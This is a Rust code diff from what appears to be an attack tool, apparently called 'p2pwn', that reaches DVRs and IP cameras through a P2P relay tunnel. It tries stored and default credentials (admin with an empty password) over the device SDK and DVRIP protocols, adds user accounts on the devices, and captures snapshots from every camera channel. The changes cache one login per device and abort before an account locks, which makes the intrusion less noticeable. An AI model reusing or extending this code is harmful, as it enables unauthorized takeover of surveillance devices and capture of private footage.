@@ -431,8 +431,12 @@ async fn sdk_test_devices(
                 sdk::SdkInfo::BindFailed => {
                     eprintln!("  [-] SDK bind on 37777 failed (tunnel not carrying the bind)");
                 }
-                sdk::SdkInfo::LoginFailed => {
-                    eprintln!("  [-] SDK bind OK but login {} rejected", tag);
+                sdk::SdkInfo::AuthRejected(e) => {
+                    eprintln!("  [-] SDK login {} rejected: {}", tag, e.describe());
+                    if e.should_abort() {
+                        eprintln!("  [-] aborting further SDK logins (would lock the account)");
+                        break;
+                    }
                 }
             }
         }
@@ -993,7 +997,12 @@ async fn try_add_user(
     // HTTP/RPC2 fallback below instead of aborting.
     let chal = dhp_challenge(sock, pcp_session, args, probe_timeout).await;
     let chal_realm = chal.as_ref().map(|c| c.realm.clone()).unwrap_or_default();
-    let mut device_http_port: Option<u16> = None;
+    // Prefer the device's real HTTP port (decrypted from `/info/device` during the
+    // handshake); when a DHIP session is up it is refined below via InetWeb. Without
+    // this, firmware that never answers DHIP `global.login` (challenge `None`) falls
+    // back to binding ports 80/5000, which such devices answer with CONN+DISC, so
+    // `/RPC2_Login` never gets a reply and the add fails with "login challenge timeout".
+    let mut device_http_port: Option<u16> = hr.device_http_port;
 
     if let Some(chal_ref) = chal.as_ref() {
         if args.verbose {
@@ -1059,9 +1068,13 @@ async fn try_add_user(
         (&hr2.device_socket, &hr2.device_session)
     };
 
-    // Fallback: HTTP/RPC2 on fresh sockets. The device's real HTTP port (read
-    // from InetWeb while the DHIP session was live) comes first; 80/5000 stay
-    // as guesses for when that query was not possible or reported nothing.
+    // Fallback: HTTP/RPC2 on fresh sockets. The device's real HTTP port (decrypted
+    // from `/info/device` at handshake time, or read from InetWeb while the DHIP
+    // session was live) comes first; 80/5000 stay as guesses for when neither
+    // source exposed it.
+    if device_http_port.is_none() {
+        device_http_port = hr2.device_http_port;
+    }
     let mut ports: Vec<u16> = Vec::new();
     if let Some(p) = device_http_port {
         ports.push(p);
@@ -2030,9 +2043,22 @@ async fn sdk_dvrip_add_user(
     let mut last_err = "DVRIP login failed".to_string();
     for (auser, apass) in &creds {
         let client = sdk::SdkClient::new(auser, apass).with_verbose(args.verbose);
-        let Some((realm_id, sid, chal_realm)) = client.dvrip_open(sock, pcp_session).await else {
-            last_err = "DVRIP bind/login failed".to_string();
-            continue;
+        let (realm_id, sid, chal_realm) = match client.dvrip_open(sock, pcp_session).await {
+            Ok(v) => v,
+            Err(e) => {
+                last_err = format!("DVRIP login failed: {}", e.describe());
+                if args.verbose {
+                    eprintln!("  [debug] DVRIP login ({}) rejected: {}", auser, e.describe());
+                }
+                if e.should_abort() {
+                    eprintln!(
+                        "  [!] aborting DVRIP login: {} (further attempts would lock the account)",
+                        e.describe()
+                    );
+                    return Err(last_err);
+                }
+                continue;
+            }
         };
         if args.verbose {
             eprintln!(
@@ -3527,6 +3553,60 @@ async fn narrow_bind_ports(
     }
 }
 
+/// Ensure a reusable SDK (37777) login for the device. The device login is
+/// per-device, not per-channel, so each candidate credential is tried **once**
+/// and the resulting session is cached for every later channel. On a locked or
+/// invalid account `dead` is set so later channels do not burn more of the
+/// device's login-attempt budget.
+async fn sdk_ensure_login(
+    sock: &UdpSocket,
+    pcp_session: &Mutex<PTCPSession>,
+    creds: &[(String, String, String)],
+    slot: &mut Option<(sdk::SdkSession, String)>,
+    dead: &mut bool,
+    verbose: bool,
+) -> bool {
+    if *dead {
+        return false;
+    }
+    if slot.is_some() {
+        return true;
+    }
+    let tag_of = |label: &str| -> String {
+        if label.is_empty() {
+            "sdk".to_string()
+        } else {
+            label.to_string()
+        }
+    };
+    for (label, user, pass) in creds {
+        let client = sdk::SdkClient::new(user, pass).with_verbose(verbose);
+        match client.open_session(sock, pcp_session).await {
+            Ok(s) => {
+                if verbose {
+                    eprintln!("  [debug] SDK login ok ({}), reusing for all channels", tag_of(label));
+                }
+                *slot = Some((s, tag_of(label)));
+                return true;
+            }
+            Err(e) => {
+                if verbose {
+                    eprintln!("  [debug] SDK login ({}) rejected: {}", tag_of(label), e.describe());
+                }
+                if e.should_abort() {
+                    eprintln!(
+                        "  [!] aborting SDK logins: {} (further attempts would lock the account)",
+                        e.describe()
+                    );
+                    *dead = true;
+                    return false;
+                }
+            }
+        }
+    }
+    false
+}
+
 async fn snapshot_device(
     serial: &str,
     args: &Args,
@@ -3642,7 +3722,19 @@ async fn snapshot_device(
                     }
                     break;
                 }
-                sdk::SdkInfo::LoginFailed => {}
+                sdk::SdkInfo::AuthRejected(e) => {
+                    if args.verbose {
+                        eprintln!("  [debug] SDK discovery login rejected: {}", e.describe());
+                    }
+                    if e.should_abort() {
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] SDK account locked/invalid, skipping remaining credentials"
+                            );
+                        }
+                        break;
+                    }
+                }
             }
         }
     }
@@ -3746,6 +3838,13 @@ async fn snapshot_device(
 
     let mut captured = 0usize;
     let mut consecutive_failures = 0usize;
+
+    // One SDK (37777) login per device, reused across every channel: the device
+    // login is per-device, so re-logging in per channel/credential is wasteful
+    // and dangerous (each failed attempt eats the account's remaining budget —
+    // 7C03FF7PAZ93E44 locked after a per-channel credential loop).
+    let mut sdk_slot: Option<(sdk::SdkSession, String)> = None;
+    let mut sdk_dead = false;
 
     for ch in &channels {
         let mut body: Option<Vec<u8>> = None;
@@ -4005,23 +4104,36 @@ async fn snapshot_device(
             // Next in p2pwn order after RTSP is the SDK channel (the CGI
             // snapshot.cgi exchange flatlines the relay agent on some DVRs, so
             // it comes last). The DHIP channel was already freed during port
-            // narrowing, so the 37777 bind is free to use.
+            // narrowing, so the 37777 bind is free to use. The login is done
+            // once per device and reused for every channel.
             if body.is_none() {
-                for (label, quser, qpass) in &strategies {
-                    let tag = if label.is_empty() { "sdk" } else { label };
+                let creds: Vec<(String, String, String)> = strategies
+                    .iter()
+                    .map(|(l, u, p)| ((*l).to_string(), u.clone(), p.clone()))
+                    .collect();
+                if sdk_ensure_login(
+                    sock,
+                    pcp_session,
+                    &creds,
+                    &mut sdk_slot,
+                    &mut sdk_dead,
+                    args.verbose,
+                )
+                .await
+                {
+                    let (sess, label) = sdk_slot.as_ref().unwrap();
                     if args.verbose {
-                        eprintln!("  [debug] ch{} trying {} (SDK 37777 via tunnel)", ch, tag);
+                        eprintln!("  [debug] ch{} snapshot via reused SDK login ({})", ch, label);
                     }
-                    let client = sdk::SdkClient::new(quser, qpass).with_verbose(args.verbose);
-                    let jpeg = client.get_snapshot(sock, pcp_session, *ch as usize).await;
+                    let client = sdk::SdkClient::new("", "").with_verbose(args.verbose);
+                    let jpeg = client.snapshot_on(sock, pcp_session, sess, *ch as usize).await;
                     if let Some(jpeg_data) = jpeg {
                         if args.verbose {
-                            eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, tag);
+                            eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, label);
                         }
                         body = Some(jpeg_data);
-                        break;
                     } else if args.verbose {
-                        eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, tag);
+                        eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, label);
                     }
                 }
                 if body.is_none() && args.verbose {
@@ -4303,25 +4415,29 @@ async fn snapshot_device(
             if args.password.is_empty() && args.admin_pass.is_empty() {
                 creds.push((String::new(), "admin".to_string(), String::new()));
             }
-            for (label, quser, qpass) in creds {
-                let tag = if label.is_empty() {
-                    "sdk".to_string()
-                } else {
-                    label
-                };
+            if sdk_ensure_login(
+                sock,
+                pcp_session,
+                &creds,
+                &mut sdk_slot,
+                &mut sdk_dead,
+                args.verbose,
+            )
+            .await
+            {
+                let (sess, label) = sdk_slot.as_ref().unwrap();
                 if args.verbose {
-                    eprintln!("  [debug] ch{} trying {} (SDK 37777 via tunnel)", ch, tag);
+                    eprintln!("  [debug] ch{} snapshot via reused SDK login ({})", ch, label);
                 }
-                let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
-                let jpeg = client.get_snapshot(sock, pcp_session, *ch as usize).await;
+                let client = sdk::SdkClient::new("", "").with_verbose(args.verbose);
+                let jpeg = client.snapshot_on(sock, pcp_session, sess, *ch as usize).await;
                 if let Some(jpeg_data) = jpeg {
                     if args.verbose {
-                        eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, tag);
+                        eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, label);
                     }
                     body = Some(jpeg_data);
-                    break;
                 } else if args.verbose {
-                    eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, tag);
+                    eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, label);
                 }
             }
             if body.is_none() && args.verbose {
@@ -4554,6 +4670,12 @@ async fn snapshot_device(
         if let Some(c) = chal.as_ref() {
             ptcp_disconnect(sock, pcp_session, c.realm_id).await;
         }
+    }
+
+    // Release the per-device SDK login (kept open across every channel above).
+    if let Some((sess, _)) = sdk_slot.as_ref() {
+        let client = sdk::SdkClient::new("", "");
+        client.close_session(sock, pcp_session, sess).await;
     }
 
     if captured == 0 {
